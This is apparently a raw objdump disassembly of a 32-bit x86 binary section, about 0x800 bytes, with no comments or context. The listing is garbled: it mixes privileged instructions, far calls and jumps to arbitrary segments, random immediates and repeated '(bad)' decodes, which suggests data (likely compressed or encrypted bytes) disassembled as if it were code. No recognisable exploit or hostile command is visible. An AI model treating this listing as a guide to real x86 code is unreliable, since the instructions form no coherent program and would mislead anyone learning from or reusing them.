  413aee:	outs   dx,DWORD PTR ds:[esi]
  413aef:	adc    al,0x49
  413af1:	arpl   ax,dx
  413af3:	pop    ebx
  413af4:	sti    
  413af5:	cld    
  413af6:	std    
  413af7:	pusha  
  413af8:	fnstcw WORD PTR [ecx-0xf529683]
  413afe:	xchg   BYTE PTR [ebp+0x77333b99],ah
  413b04:	and    al,0x7b
  413b06:	ins    DWORD PTR es:[edi],dx
  413b07:	test   al,0x79
  413b09:	and    eax,0x78503feb
  413b0e:	jns    0x413aa2
  413b10:	mov    ah,0x70
  413b12:	pop    edi
  413b13:	lods   al,BYTE PTR gs:[esi]
  413b15:	stos   BYTE PTR es:[edi],al
  413b16:	inc    esp
  413b17:	or     eax,0x56c11560
  413b1c:	scas   al,BYTE PTR es:[edi]
  413b1d:	add    eax,0x2fe60fe7
  413b22:	push   0xe2a4a07e
  413b27:	out    0x2c,eax
  413b29:	push   eax
  413b2a:	daa    
  413b2b:	mov    bh,0x1b
  413b2d:	and    DWORD PTR [edi+ecx*4-0x7c357b63],0x1e27713e
  413b38:	call   0xa4f6:0x7bbad5a9
  413b3f:	addr16 cmc 
  413b41:	jae    0x413b78
  413b43:	cwde   
  413b44:	jge    0x413b42
  413b46:	or     BYTE PTR ds:0x9a979029,dh
  413b4c:	inc    ebp
  413b4d:	data16 mov al,ds:0xb796c77f
  413b53:	mov    edx,0xd59ae9c3
  413b58:	(bad)  
  413b5a:	gs pop ss
  413b5c:	push   eax
  413b5d:	inc    edi
  413b5e:	jne    0x413bd7
  413b60:	mov    WORD PTR [ebp-0x27483675],?
  413b66:	pop    ebx
  413b67:	in     al,dx
  413b68:	push   ecx
  413b69:	pop    eax
  413b6a:	push   ebx
  413b6b:	sbb    ebp,DWORD PTR [eax+eax*8-0x6e]
  413b6f:	in     al,0x9
  413b71:	sbb    ecx,DWORD PTR [eax]
  413b73:	add    al,0x90
  413b75:	or     eax,0x62c83469
  413b7a:	sub    DWORD PTR [esi],eax
  413b7c:	out    0x1b,eax
  413b7e:	xchg   esi,eax
  413b7f:	rcr    BYTE PTR [esi+0x6b],0x5f
  413b83:	fstp   TBYTE PTR [esi]
  413b85:	data16 jge 0x413b4a
  413b88:	add    DWORD PTR [ebx+ebp*8-0x58e162bb],esp
  413b8f:	xchg   esp,eax
  413b90:	adc    eax,0xc7a842c0
  413b95:	lahf   
  413b96:	scas   eax,DWORD PTR es:[edi]
  413b97:	pop    esp
  413b98:	fincstp 
  413b9a:	inc    ecx
  413b9b:	adc    al,0x8b
  413b9d:	mov    ds:0xe0b8c89e,al
  413ba2:	sbb    eax,0xe0822362
  413ba7:	in     eax,0xe
  413ba9:	aam    0x82
  413bab:	popf   
  413bac:	adc    bh,cl
  413bae:	fadd   QWORD PTR [esi+0x79]
  413bb1:	jae    0x413bac
  413bb3:	call   0x57f6:0x1f988bdc
  413bba:	push   eax
  413bbb:	adc    eax,0x6dd651a0
  413bc0:	mov    edi,0x4a98e2fa
  413bc5:	xor    al,BYTE PTR [edi+ebx*1-0x1a30446b]
  413bcc:	mov    ecx,0x5e475764
  413bd1:	adc    eax,0xc2109303
  413bd6:	xor    ah,BYTE PTR [edx]
  413bd8:	cs das 
  413bda:	pop    ebp
  413bdb:	dec    ebp
  413bdc:	ja     0x413c42
  413bde:	inc    edi
  413bdf:	xor    dh,BYTE PTR [eax+esi*4+0x48]
  413be3:	jno    0x413c52
  413be5:	cwde   
  413be6:	test   edi,edi
  413be8:	das    
  413be9:	sahf   
  413bea:	xor    ah,BYTE PTR [edx]
  413bec:	push   0x5e
  413bee:	and    DWORD PTR [eax+0x6f36a893],0xffffffab
  413bf5:	add    eax,0xe95ca9b8
  413bfa:	inc    ebp
  413bfb:	dec    edx
  413bfc:	pop    ebp
  413bfd:	or     eax,0x91869d54
  413c02:	cwde   
  413c03:	loopne 0x413c7e
  413c05:	inc    edi
  413c06:	cwde   
  413c07:	mov    ch,0x96
  413c09:	loop   0x413bc6
  413c0b:	pop    edi
  413c0c:	daa    
  413c0d:	sbb    DWORD PTR [edi-0x3df5d3ef],esi
  413c13:	mov    DWORD PTR [edx+ebp*4+0x534e0e17],ecx
  413c1a:	jb     0x413c55
  413c1c:	sub    ebx,DWORD PTR [edi+0x10fc86cb]
  413c22:	shl    BYTE PTR [ecx-0xd],1
  413c25:	mov    ebp,gs
  413c27:	push   edx
  413c28:	mov    esp,0x59b1068e
  413c2e:	out    0xdc,al
  413c30:	(bad)  
  413c31:	clc    
  413c32:	mov    eax,ds:0xb7b75eb7
  413c37:	pop    ebp
  413c38:	pop    es
  413c39:	xchg   BYTE PTR [esi-0x71dbc475],al
  413c3f:	dec    ebp
  413c40:	lods   eax,DWORD PTR ds:[esi]
  413c41:	aam    0x3d
  413c43:	pop    ss
  413c44:	push   ebx
  413c45:	add    eax,0x1be8e5d6
  413c4a:	pop    ds
  413c4b:	add    eax,0x4c5cd0c8
  413c50:	xchg   edx,eax
  413c51:	and    eax,0xc1a380dd
  413c56:	mov    edi,0x9c244448
  413c5b:	push   es
  413c5c:	js     0x413cb3
  413c5e:	add    esi,DWORD PTR fs:[eax+0x6f155cda]
  413c65:	ret    0x6f28
  413c68:	jns    0x413c3a
  413c6a:	add    BYTE PTR [esi-0x66],0xb9
  413c6e:	and    BYTE PTR [eax+0x11],ch
  413c71:	jge    0x413c37
  413c73:	jmp    0x9689:0xcb925291
  413c7a:	jg     0x413c3d
  413c7c:	jno    0x413c14
  413c7e:	and    DWORD PTR [eax],0x6079b850
  413c84:	ds (bad) 
  413c86:	adc    ebp,DWORD PTR [edx+ebx*4+0x57]
  413c8a:	fidivr DWORD PTR [eax+0x14de67d4]
  413c90:	sti    
  413c91:	dec    ebx
  413c92:	jl     0x413c60
  413c94:	ins    DWORD PTR es:[edi],dx
  413c95:	stos   DWORD PTR es:[edi],eax
  413c96:	mov    ch,0x90
  413c98:	in     al,0x1d
  413c9a:	test   DWORD PTR [esi-0x3b],ebx
  413c9d:	cld    
  413c9e:	pop    ds
  413c9f:	scas   al,BYTE PTR es:[edi]
  413ca0:	jne    0x413c87
  413ca2:	xchg   edi,eax
  413ca3:	sub    ecx,DWORD PTR [ebp-0x5b]
  413ca6:	jp     0x413ce6
  413ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ca9:	push   cs
  413caa:	repz xor al,0x87
  413cad:	mov    gs,WORD PTR [ebx+0x2d]
  413cb0:	sbb    DWORD PTR [esi+ecx*8-0x78],ebx
  413cb4:	dec    edx
  413cb5:	inc    esi
  413cb6:	hlt    
  413cb7:	add    eax,0x90dea453
  413cbc:	ret    
  413cbd:	mov    bl,BYTE PTR [ebp+0x33feb372]
  413cc3:	add    BYTE PTR [edx+0xa372ed3],bl
  413cc9:	repz retf 0x4c2e
  413ccd:	(bad)  
  413ccf:	xor    DWORD PTR [esi],0x4e
  413cd2:	stos   DWORD PTR es:[edi],eax
  413cd3:	jnp    0x413cb6
  413cd5:	jbe    0x413d15
  413cd7:	sbb    al,0x30
  413cd9:	clc    
  413cda:	jge    0x413d3a
  413cdc:	mov    al,0x61
  413cde:	xor    al,0x43
  413ce0:	mov    al,ds:0x1280f11a
  413ce5:	xchg   edx,eax
  413ce6:	jl     0x413cb8
  413ce8:	aaa    
  413ce9:	mov    esi,0x6c5643b8
  413cee:	fimul  DWORD PTR [edi]
  413cf0:	call   0x10c8e78b
  413cf5:	iret   
  413cf6:	jp     0x413d54
  413cf8:	bound  ebp,QWORD PTR [edi+0x3882f467]
  413cfe:	push   edx
  413cff:	pop    edi
  413d00:	dec    edi
  413d01:	lods   al,BYTE PTR ds:[esi]
  413d02:	gs pusha 
  413d04:	jnp    0x413cf3
  413d06:	push   esi
  413d07:	mov    edx,0x3d337b12
  413d0c:	jb     0x413cd6
  413d0e:	ficomp WORD PTR [esi-0x4d]
  413d11:	(bad)  
  413d12:	fucomip st,st(6)
  413d14:	outs   dx,BYTE PTR ss:[esi]
  413d16:	xchg   DWORD PTR [ecx+esi*2],ecx
  413d19:	or     DWORD PTR [edx-0x20],0xffffff86
  413d1d:	jg     0x413d35
  413d1f:	mov    ebp,0x5e5c3024
  413d24:	call   0xb5a26c02
  413d29:	mov    cl,0x3a
  413d2b:	(bad)  
  413d2e:	int    0xd
  413d30:	mov    eax,0xd1abbef1
  413d35:	mov    dh,BYTE PTR [eax+0x20]
  413d38:	je     0x413ccf
  413d3a:	mov    ecx,0x4fd82a8e
  413d3f:	pop    esi
  413d40:	repz dec ebx
  413d42:	mov    esi,0xb5069613
  413d47:	lea    eax,[ebx+0x59a43d4e]
  413d4d:	add    DWORD PTR [edi-0x26],esp
  413d50:	pop    ecx
  413d51:	xor    DWORD PTR [ecx-0x46],0x20
  413d55:	icebp  
  413d56:	jmp    0xce9ebac5
  413d5b:	xcrypt-ctr 
  413d5e:	cli    
  413d5f:	(bad)  
  413d60:	in     eax,dx
  413d61:	push   edx
  413d62:	or     BYTE PTR [eax],bl
  413d64:	test   al,0xf5
  413d66:	scas   eax,DWORD PTR es:[edi]
  413d67:	push   edx
  413d68:	fs dec ebp
  413d6a:	je     0x413dbf
  413d6c:	or     DWORD PTR ds:0xab72fe19,0xffffffb4
  413d73:	shl    DWORD PTR [esi-0x70],0x4e
  413d77:	inc    ebp
  413d78:	jmp    0xe7d9:0x13ee3f8d
  413d7f:	cmp    BYTE PTR [edi+0x4212cd83],al
  413d85:	clc    
  413d86:	jle    0x413d99
  413d88:	std    
  413d89:	imul   eax,DWORD PTR [eax-0x59645da4],0xcd0cfbc0
  413d93:	seto   BYTE PTR [esi-0x285e8353]
  413d9a:	pop    eax
  413d9b:	lods   al,BYTE PTR ds:[esi]
  413d9c:	icebp  
  413d9d:	outs   dx,DWORD PTR ds:[esi]
  413d9e:	in     al,0xf4
  413da0:	jg     0x413df3
  413da2:	popf   
  413da3:	iret   
  413da4:	and    bl,BYTE PTR [esi-0x6a32c091]
  413daa:	dec    esp
  413dab:	in     eax,dx
  413dac:	scas   eax,DWORD PTR es:[edi]
  413dad:	adc    eax,esp
  413daf:	jmp    0x16c994f8
  413db4:	or     BYTE PTR [edi],bh
  413db6:	xchg   edi,eax
  413db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413db8:	repz sbb al,0xd1
  413dbb:	call   0x203:0x31643052
  413dc2:	pushf  
  413dc3:	icebp  
  413dc4:	dec    edi
  413dc5:	cdq    
  413dc6:	les    ebx,FWORD PTR [esp+ebp*8]
  413dc9:	stos   DWORD PTR es:[edi],eax
  413dca:	mov    ah,0x2
  413dcc:	outs   dx,DWORD PTR ds:[esi]
  413dcd:	retf   0x4096
  413dd0:	(bad)  
  413dd1:	aam    0xf9
  413dd3:	mov    ecx,0xfd4a110f
  413dd8:	mov    cl,0xa3
  413dda:	pop    edi
  413ddb:	adc    dh,BYTE PTR [edx]
  413ddd:	fdivr  st(0),st
  413ddf:	and    BYTE PTR [edi],ah
  413de1:	dec    esp
  413de2:	jmp    0x74c32b01
  413de7:	aam    0x82
  413de9:	adc    ax,WORD PTR [edx-0x53]
  413ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dee:	hlt    
  413def:	mov    ecx,0x1779128b
  413df4:	cli    
  413df5:	dec    eax
  413df6:	(bad)  
  413df7:	and    eax,0xeacb8656
  413dfc:	dec    esp
  413dfd:	hlt    
  413dfe:	test   eax,0x1b05e5f1
  413e03:	jl     0x413e29
  413e05:	cdq    
  413e06:	arpl   WORD PTR [ebx+edi*1-0x15],ax
  413e0a:	mov    bh,0xdc
  413e0c:	cmp    ah,cl
  413e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e0f:	test   al,0x9e
  413e11:	push   edi
  413e12:	push   edx
  413e13:	fst    QWORD PTR [ecx-0x62]
  413e16:	sbb    esp,edi
  413e18:	fmul   QWORD PTR [ecx-0x71]
  413e1b:	retf   0x76c8
  413e1e:	cmp    ecx,DWORD PTR es:[edx]
  413e21:	lock dec ebp
  413e23:	add    BYTE PTR [eax+0x6d],bh
  413e26:	popf   
  413e27:	pop    ebp
  413e28:	add    BYTE PTR [ebx-0x7353f993],0xef
  413e2f:	push   ecx
  413e30:	enter  0xe05c,0xfd
  413e34:	icebp  
  413e35:	push   eax
  413e36:	pop    edx
  413e37:	cmc    
  413e38:	mov    ecx,0x9b27c8f2
  413e3d:	iret   
  413e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e3f:	scas   eax,DWORD PTR es:[edi]
  413e40:	sub    eax,0xae4c039e
  413e45:	mov    eax,0xb0bcadef
  413e4a:	mov    al,0x4e
  413e4c:	adc    cl,BYTE PTR [eax+eiz*2-0x6f94feef]
  413e53:	sbb    BYTE PTR [ecx],dl
  413e55:	ficom  DWORD PTR [ebx]
  413e57:	popf   
  413e58:	inc    eax
  413e59:	add    eax,0x1b039684
  413e5e:	and    eax,0x4a70ebef
  413e63:	out    0xaf,al
  413e65:	pop    edi
  413e66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e67:	sbb    ebp,ebx
  413e69:	mov    al,ds:0x1f30e37
  413e6e:	mov    eax,ds:0x36c3637
  413e73:	jb     0x413e40
  413e75:	cmp    DWORD PTR [ebp+edx*4+0x2b14111a],ebp
  413e7c:	mov    ecx,0x434ef75f
  413e81:	push   eax
  413e82:	aas    
  413e83:	test   DWORD PTR [esi],eax
  413e85:	out    dx,eax
  413e86:	in     al,0x6d
  413e88:	mov    esi,0xfb839335
  413e8d:	xchg   ecx,eax
  413e8e:	pop    ss
  413e8f:	mov    esi,ecx
  413e91:	sahf   
  413e92:	fdiv   QWORD PTR [edi]
  413e94:	mov    bl,0xf6
  413e96:	push   es
  413e97:	xor    DWORD PTR [esp+eiz*8],eax
  413e9a:	repz mov al,0xfc
  413e9d:	push   ebp
  413e9e:	xchg   BYTE PTR [eax-0x42ad3f9c],cl
  413ea4:	xor    eax,0x26a78029
  413ea9:	addr16 dec edi
  413eab:	data16 sub BYTE PTR [edi+ebp*8+0x110c24c6],cl
  413eb3:	mov    ds:0xb405d0ee,eax
  413eb8:	pop    es
  413eb9:	mov    esp,0x824ebc2d
  413ebe:	test   ch,bl
  413ec0:	add    al,BYTE PTR ds:0xf1241072
  413ec6:	stos   BYTE PTR es:[edi],al
  413ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec8:	cmp    cl,cl
  413eca:	aaa    
  413ecb:	pop    esi
  413ecc:	cmc    
  413ecd:	and    eax,0xa6f2cdce
  413ed2:	jae    0x413ec3
  413ed4:	out    0x53,al
  413ed6:	(bad)  
  413ed7:	gs iret 
  413ed9:	jbe    0x413f49
  413edb:	fcomp  DWORD PTR [eax+0x537d0f2a]
  413ee1:	push   DWORD PTR [ebx-0xf]
  413ee4:	invd   
  413ee6:	out    0x79,al
  413ee8:	sbb    al,0x2a
  413eea:	push   ebx
  413eeb:	cli    
  413eec:	push   cs
  413eed:	jns    0x413e7d
  413eef:	outs   dx,BYTE PTR ds:[esi]
  413ef0:	add    al,0xbb
  413ef2:	stos   DWORD PTR es:[edi],eax
  413ef3:	pop    es
  413ef4:	or     al,0x85
  413ef6:	dec    BYTE PTR [ecx+0x8e9596b]
  413efc:	popf   
  413efd:	cmp    al,0x26
  413eff:	jne    0x413f1f
  413f01:	loopne 0x413e9d
  413f03:	sub    al,0x93
  413f05:	inc    eax
  413f06:	or     DWORD PTR [ebx],eax
  413f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f09:	cmc    
  413f0a:	pop    esp
  413f0b:	ret    0xfeb1
  413f0e:	aaa    
  413f0f:	add    al,0xed
  413f11:	mov    ch,0x99
  413f13:	push   ebx
  413f14:	mov    bl,0x79
  413f16:	test   eax,0x9cd3ea5b
  413f1b:	retf   
  413f1c:	jmp    0x69d1:0x69cfd65a
  413f23:	pop    ecx
  413f24:	nop
  413f25:	push   esp
  413f26:	dec    esp
  413f27:	test   BYTE PTR [eax+0x7e],0xf
  413f2b:	or     al,0xe8
  413f2d:	call   0x7e0d3ee8
  413f32:	aad    0x44
  413f34:	jmp    0x6da8:0x9c2cc96a
  413f3b:	or     eax,0xa071b6b3
  413f40:	(bad)  
  413f42:	ss push edx
  413f44:	popf   
  413f45:	cmc    
  413f46:	add    eax,0x14994ede
  413f4b:	bound  ebp,QWORD PTR ds:0xe453f283
  413f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f52:	cmp    eax,0xdb4203d9
  413f57:	push   esp
  413f58:	addr16 adc eax,0x6e26519f
  413f5e:	outs   dx,DWORD PTR ds:[esi]
  413f5f:	sbb    al,0xa9
  413f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f62:	pusha  
  413f63:	fwait
  413f64:	lock ss das 
  413f67:	adc    al,0x19
  413f69:	push   ds
  413f6a:	xchg   ebp,eax
  413f6b:	test   BYTE PTR [esi],ah
  413f6d:	push   0xe0ff001f
  413f72:	and    BYTE PTR [edx],0x4b
  413f75:	icebp  
  413f76:	out    0x4c,eax
  413f78:	push   esi
  413f79:	jb     0x413f1b
  413f7b:	pop    edx
  413f7c:	retf   
  413f7d:	mov    ebp,0x63573265
  413f82:	jp     0x413fe3
  413f84:	adc    al,0xa6
  413f86:	(bad)  
  413f87:	xor    eax,0x2c866e5b
  413f8c:	jae    0x413fc0
  413f8e:	test   BYTE PTR ss:[edx+0x3b],cl
  413f92:	fild   WORD PTR [ebx-0x1c]
  413f95:	add    dh,BYTE PTR [edi+ebx*2+0x1d]
  413f99:	or     ebp,DWORD PTR [edi-0x5b9efc40]
  413f9f:	repz jbe 0x414018
  413fa2:	mov    dl,0x99
  413fa4:	ret    
  413fa5:	test   edx,ebx
  413fa7:	xchg   edx,eax
  413fa8:	mov    ecx,edi
  413faa:	fnstenv [ecx]
  413fac:	and    bh,bl
  413fae:	fmul   QWORD PTR [ebx+0x13]
  413fb1:	sbb    dh,BYTE PTR [ebx+0x4525d978]
  413fb7:	xor    al,0xc5
  413fb9:	stc    
  413fba:	mov    dh,0xea
  413fbc:	outs   dx,BYTE PTR ds:[esi]
  413fbd:	adc    al,0x1
  413fbf:	jle    0x413fb2
  413fc1:	sub    edx,DWORD PTR [ebx-0xbdbc86f]
  413fc7:	popf   
  413fc8:	or     BYTE PTR [ecx],ch
  413fca:	jae    0x41403a
  413fcc:	ins    DWORD PTR es:[edi],dx
  413fcd:	mov    ch,0x5
  413fcf:	mov    eax,ds:0xf6dc2f34
  413fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fd5:	enter  0xd9d3,0x89
  413fd9:	outs   dx,DWORD PTR ds:[esi]
  413fda:	out    0x7d,eax
  413fdc:	jle    0x414055
  413fde:	lods   eax,DWORD PTR ds:[esi]
  413fdf:	xor    DWORD PTR [ebp-0x2e],0xa4d31ac4
  413fe6:	cmp    BYTE PTR [esi],ch
  413fe8:	mov    ch,ah
  413fea:	add    al,0x33
  413fec:	in     eax,dx
  413fed:	pop    ecx
  413fee:	arpl   WORD PTR [edi+eax*8+0x58e887bc],dx
  413ff5:	fsub   DWORD PTR [edx*2+0x1b353829]
  413ffc:	and    eax,0x7e9cc888
  414001:	inc    eax
  414002:	push   cs
  414003:	(bad)  
  414004:	mov    ebp,0xaa735cfa
  414009:	lea    eax,[ebp-0x59809ca6]
  41400f:	push   es
  414010:	jno    0x413f92
  414012:	stos   BYTE PTR es:[edi],al
  414013:	int3   
  414014:	ins    BYTE PTR es:[edi],dx
  414015:	bound  ebx,QWORD PTR [edx]
  414017:	into   
  414018:	test   al,0xe2
  41401a:	push   eax
  41401b:	sbb    DWORD PTR [esi+0x51],0xc69e21c0
  414022:	sub    BYTE PTR [ebx-0x420ce718],0xb6
  414029:	pop    eax
  41402a:	imul   ebx,ebx,0xccaf2f78
  414030:	push   esp
  414031:	les    ebp,FWORD PTR [esi]
  414033:	dec    esi
  414034:	repz jmp 0x51b735d2
  41403a:	push   ds
  41403b:	add    BYTE PTR [ecx-0x7578792a],ch
  414041:	fstp   DWORD PTR [ecx+esi*1]
  414044:	ss hlt 
  414046:	sub    dh,ch
  414048:	jnp    0x413fdf
  41404a:	dec    esi
  41404b:	inc    edi
  41404c:	pop    ds
  41404d:	or     eax,0x77566f86
  414052:	jb     0x41404e
  414054:	lds    eax,FWORD PTR [ebx-0x189eee19]
  41405a:	add    DWORD PTR [eax-0x10200590],0x1f
  414061:	dec    ecx
  414062:	sub    DWORD PTR [edx+0x50799827],0x66
  414069:	test   al,0xd8
  41406b:	aas    
  41406c:	or     esp,edx
  41406e:	rcl    BYTE PTR [ebp-0x6],0x2f
  414072:	clc    
  414073:	fdiv   DWORD PTR ds:0x40181a1
  414079:	ins    DWORD PTR es:[edi],dx
  41407a:	in     eax,0xc
  41407c:	pop    edx
  41407d:	jnp    0x4140d1
  41407f:	daa    
  414080:	inc    esp
  414081:	pop    esp
  414082:	pcmpeqb mm7,QWORD PTR [ecx+0x627cf6a2]
  414089:	sbb    ecx,esp
  41408b:	push   cs
  41408c:	sbb    eax,0x781d2bab
  414091:	xor    al,0xff
  414093:	lea    edi,[edx+0x290e8f68]
  414099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41409a:	cs scas eax,DWORD PTR es:[edi]
  41409c:	lahf   
  41409d:	jbe    0x4140d2
  41409f:	add    DWORD PTR [edx],eax
  4140a1:	sub    eax,0xfc3d5535
  4140a6:	icebp  
  4140a7:	sbb    al,0x2b
  4140a9:	shr    DWORD PTR [edx+0x2966eeb7],cl
  4140af:	aad    0xf5
  4140b1:	int    0x6b
  4140b3:	leave  
  4140b4:	pop    eax
  4140b5:	add    BYTE PTR [ebx],bh
  4140b7:	xor    esi,esi
  4140b9:	dec    edi
  4140ba:	les    edi,FWORD PTR [ebx+ebp*2+0x3b]
  4140be:	inc    edx
  4140bf:	push   es
  4140c0:	cmp    esp,esi
  4140c2:	mov    dl,0xec
  4140c4:	out    dx,eax
  4140c5:	mov    dl,0x1
  4140c7:	imul   ecx,edi,0xffffffc5
  4140ca:	in     al,dx
  4140cb:	ds inc ebp
  4140cd:	jne    0x41408e
  4140cf:	push   esi
  4140d0:	paddd  mm5,QWORD PTR [edi+0x4b]
  4140d4:	and    al,0x84
  4140d6:	retf   
  4140d7:	sub    al,0xb9
  4140d9:	pop    ds
  4140da:	and    dh,BYTE PTR [edx+eax*4-0x56b7f38e]
  4140e1:	jno    0x4140ba
  4140e3:	(bad)  
  4140e4:	das    
  4140e5:	cmp    al,BYTE PTR [edx-0x14]
  4140e8:	out    0x1b,eax
  4140ea:	xor    eax,0xad5349d8
  4140ef:	add    eax,0x72db9984
  4140f4:	imul   ebp,DWORD PTR [ecx],0x39
  4140f7:	ret    0xf6c9
  4140fa:	adc    ebp,ebp
  4140fc:	in     eax,0xc3
  4140fe:	xor    DWORD PTR [ebx],ebx
  414100:	ret    
  414101:	jp     0x414093
  414103:	and    edx,DWORD PTR [esi-0x5a]
  414106:	int3   
  414107:	cmp    DWORD PTR [esi],esi
  414109:	mov    ?,WORD PTR [edi]
  41410b:	push   ebp
  41410c:	retf   
  41410d:	pop    ebp
  41410e:	inc    edx
  41410f:	push   cs
  414110:	sbb    DWORD PTR [edi+0x420f18e0],edi
  414116:	mov    eax,0x9d593fd5
  41411b:	scas   eax,DWORD PTR es:[edi]
  41411c:	shr    DWORD PTR [edx],cl
  41411e:	arpl   bx,si
  414120:	sti    
  414121:	pop    ebx
  414122:	hlt    
  414123:	ins    BYTE PTR es:[edi],dx
  414124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414125:	xor    al,0xb9
  414127:	rcr    BYTE PTR [ecx+0x5f],0x4b
  41412b:	mov    bl,0x9
  41412d:	pop    esi
  41412e:	mov    ds:0x5134e2c4,eax
  414133:	push   0xffffff95
  414135:	(bad)  
  414136:	cli    
  414137:	aam    0x16
  414139:	inc    ebx
  41413a:	das    
  41413b:	mov    edx,0xbf2c28b3
  414140:	imul   esi,DWORD PTR [esi-0x121659ce],0x7e
  414147:	mov    edx,DWORD PTR [ebx+edx*4-0x16913aa9]
  41414e:	out    dx,eax
  41414f:	dec    edi
  414150:	xor    BYTE PTR [ebx],bl
  414152:	aad    0xd
  414154:	icebp  
  414155:	xchg   edx,eax
  414156:	sbb    al,0x4b
  414158:	jmp    0xfe3ab974
  41415d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41415e:	test   eax,0xb73b014a
  414163:	pop    ebx
  414164:	lods   eax,DWORD PTR ds:[esi]
  414165:	stc    
  414166:	pop    eax
  414167:	les    ebx,FWORD PTR [edi+0x31]
  41416a:	xchg   esp,eax
  41416b:	jbe    0x41413d
  41416d:	xlat   BYTE PTR ds:[ebx]
  41416e:	xor    ecx,DWORD PTR [ebp-0x3fbd07f3]
  414174:	jg     0x41410e
  414176:	(bad)  
  414177:	cmp    al,0xfb
  414179:	xchg   edx,eax
  41417a:	daa    
  41417b:	pop    es
  41417c:	out    dx,al
  41417d:	aas    
  41417e:	aam    0x8e
  414180:	mov    bh,0x59
  414182:	mov    dh,0x60
  414184:	inc    edx
  414185:	adc    ecx,DWORD PTR [edi+0x11303aa0]
  41418b:	xchg   ebp,eax
  41418c:	(bad)  
  41418d:	(bad)  
  41418e:	pop    esp
  41418f:	fiadd  WORD PTR [edx+0x32483c32]
  414195:	add    BYTE PTR [esi+0x32840d49],ah
  41419b:	xchg   ebp,eax
  41419c:	jo     0x414180
  41419e:	push   esi
  41419f:	push   edi
  4141a0:	jbe    0x414137
  4141a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141a3:	je     0x4141e2
  4141a5:	sti    
  4141a6:	adc    dh,BYTE PTR [ebx]
  4141a8:	call   0x2549:0xd2ff5128
  4141af:	scas   eax,DWORD PTR es:[edi]
  4141b0:	ss jle 0x414160
  4141b3:	and    BYTE PTR [esi+0x3a],cl
  4141b6:	jge    0x414169
  4141b8:	leave  
  4141b9:	dec    ebx
  4141ba:	rdmsr  
  4141bc:	mov    esp,0xd14b34f1
  4141c1:	dec    ebx
  4141c2:	xchg   esi,eax
  4141c3:	inc    ecx
  4141c4:	mov    edi,0xfb765bde
  4141c9:	outs   dx,BYTE PTR ds:[esi]
  4141ca:	push   eax
  4141cb:	dec    edi
  4141cc:	repnz adc eax,0x8ef38d51
  4141d2:	out    dx,eax
  4141d3:	jne    0x4141d5
  4141d5:	mov    dh,0x1
  4141d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141d8:	int    0x84
  4141da:	pop    ecx
  4141db:	and    ebx,esp
  4141dd:	sbb    al,0xb4
  4141df:	ins    DWORD PTR es:[edi],dx
  4141e0:	and    BYTE PTR ds:0x2e8b5f71,ch
  4141e6:	popf   
  4141e7:	ins    DWORD PTR es:[edi],dx
  4141e8:	or     ebp,DWORD PTR [ebx+0x43dd41ca]
  4141ee:	sahf   
  4141ef:	test   eax,0xf98ff4e5
  4141f4:	cmp    esi,esp
  4141f6:	jmp    0xdd5821f4
  4141fb:	int3   
  4141fc:	jae    0x4141c0
  4141fe:	push   esi
  4141ff:	jae    0x414201
  414201:	push   0x42
  414203:	mov    esi,0x68061827
  414208:	inc    ecx
  414209:	inc    edx
  41420a:	jns    0x414252
  41420c:	and    ebp,eax
  41420e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41420f:	ss dec edi
  414211:	sbb    eax,ecx
  414213:	add    al,0x66
  414215:	mov    eax,0x68754a93
  41421a:	mov    al,0xa7
  41421c:	mov    ds:0x23d6da82,al
  414221:	sbb    edx,DWORD PTR [edx]
  414223:	sbb    dh,dl
  414225:	and    eax,0xbb50d928
  41422a:	(bad)  
  41422b:	mov    ah,0xce
  41422d:	inc    esi
  41422e:	cmp    esi,DWORD PTR [edi-0x3c6c6e44]
  414234:	(bad)  [ebp+0x55]
  414237:	push   cs
  414238:	push   ebp
  414239:	pop    edi
  41423a:	clc    
  41423b:	mov    bh,0x74
  41423d:	push   edi
  41423e:	call   0xb0c476f7
  414243:	or     BYTE PTR [ecx+0x1e],ch
  414246:	arpl   WORD PTR ds:0xc28cb139,dx
  41424c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41424d:	jl     0x4141e3
  41424f:	xchg   ebp,eax
  414250:	enter  0x423a,0x7b
  414254:	jecxz  0x41422b
  414256:	add    ebp,ebx
  414258:	mov    ds:0xbf5720fd,al
  41425d:	xor    bh,BYTE PTR [eax-0xae2ff7f]
  414263:	gs sub bh,0x63
  414267:	nop
  414268:	add    eax,0x330485fa
  41426d:	pop    edx
  41426e:	pop    ds
  41426f:	mov    DWORD PTR [ecx-0x7d],eax
  414272:	mov    edx,0xb1ee2254
  414277:	mov    ds:0x90f82508,eax
  41427c:	out    0xed,eax
  41427e:	push   ss
  41427f:	xor    al,0x30
  414281:	pop    ebx
  414282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414283:	mov    cl,0x6d
  414285:	call   0xe85a:0x60e8cc6f
  41428c:	cmp    al,0x46
  41428e:	js     0x4142d8
  414290:	and    ebp,DWORD PTR [esi]
  414292:	js     0x41422f
  414294:	and    BYTE PTR [ecx-0x44f3e283],ch
  41429a:	shl    bl,cl
  41429c:	add    al,0x2b
  41429e:	add    DWORD PTR [eax],esp
  4142a0:	ficomp DWORD PTR [ecx+0x46df601b]
  4142a6:	jns    0x4142b2
  4142a8:	pushf  
  4142a9:	sahf   
  4142aa:	sbb    edx,esp
  4142ac:	loopne 0x4142a9
  4142ae:	or     DWORD PTR [ebp-0x26],ecx
  4142b1:	mov    bh,0xa4
  4142b3:	adc    dl,bh
  4142b5:	cs pop edx
  4142b7:	pop    ecx
